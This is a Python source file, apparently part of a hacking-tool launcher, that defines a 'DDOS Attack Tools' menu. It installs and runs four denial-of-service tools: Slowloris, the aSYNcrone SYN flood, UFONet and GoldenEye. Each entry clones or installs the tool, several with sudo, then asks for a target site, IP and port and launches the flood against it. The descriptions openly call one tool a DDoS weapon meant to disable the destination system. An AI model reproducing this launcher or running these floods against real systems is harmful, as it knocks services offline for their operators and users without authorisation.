# coding=utf-8
import os
import subprocess

from core import HackingTool
from core import HackingToolsCollection
from core.utils import run_command


class SlowLoris(HackingTool):
    TITLE = "SlowLoris"
    DESCRIPTION = "Slowloris is basically an HTTP Denial of Service attack." \
                  "It send lots of HTTP Request"
    INSTALL_COMMANDS = [
        dict(cmd="sudo pip install slowloris"),
    ]

    def run(self):
        target_site = input("Enter Target Site:- ")
        run_command(f"slowloris {target_site}")


class Asyncrone(HackingTool):
    TITLE = "Asyncrone | Multifunction SYN Flood DDoS Weapon"
    DESCRIPTION = "aSYNcrone is a C language based, mulltifunction SYN Flood " \
                  "DDoS Weapon.\nDisable the destination system by sending a " \
                  "SYN packet intensively to the destination."
    INSTALL_COMMANDS = [
        dict(cmd="git clone https://github.com/fatih4842/aSYNcrone.git"),
        dict(cmd="sudo gcc aSYNcrone.c -o aSYNcrone -lpthread",
             cwd="aSYNcrone"),
    ]
    PROJECT_URL = "https://github.com/fatihsnsy/aSYNcrone"

    def run(self):
        source_port = input("Enter Source Port >> ")
        target_ip = input("Enter Target IP >> ")
        target_port = input("Enter Target port >> ")
        run_command(
            f"sudo ./aSYNcrone {source_port} {target_ip} {target_port} 1000",
            cwd="aSYNcrone",
        )


class UFONet(HackingTool):
    TITLE = "UFOnet"
    DESCRIPTION = "UFONet - is a free software, P2P and cryptographic " \
                  "-disruptive \n toolkit- that allows to perform DoS and " \
                  "DDoS attacks\n\b " \
                  "More Usage Visit"
    INSTALL_COMMANDS = [
        dict(cmd="sudo git clone https://github.com/epsylon/ufonet.git"),
        dict(cmd="sudo python setup.py install", cwd="ufonet"),
    ]
    RUN_COMMANDS = [
        dict(cmd="sudo ./ufonet --gui"),
    ]
    PROJECT_URL = "https://github.com/epsylon/ufonet"


class GoldenEye(HackingTool):
    TITLE = "GoldenEye"
    DESCRIPTION = "GoldenEye is an python3 app for SECURITY TESTING PURPOSES ONLY!\n" \
                  "GoldenEye is a HTTP DoS Test Tool."
    INSTALL_COMMANDS = [
        dict(cmd="sudo git clone https://github.com/jseidl/GoldenEye.git"),
        dict(cmd="chmod -R 755 GoldenEye"),
    ]
    PROJECT_URL = "https://github.com/jseidl/GoldenEye"

    def run(self):
        run_command("sudo ./goldeneye.py", cwd="GoldenEye")
        print("\033[96m Go to Directory \n "
              "[*] USAGE: ./goldeneye.py <url> [OPTIONS]")


class DDOSTools(HackingToolsCollection):
    TITLE = "DDOS Attack Tools"
    TOOLS = [SlowLoris(), Asyncrone(), UFONet(), GoldenEye()]
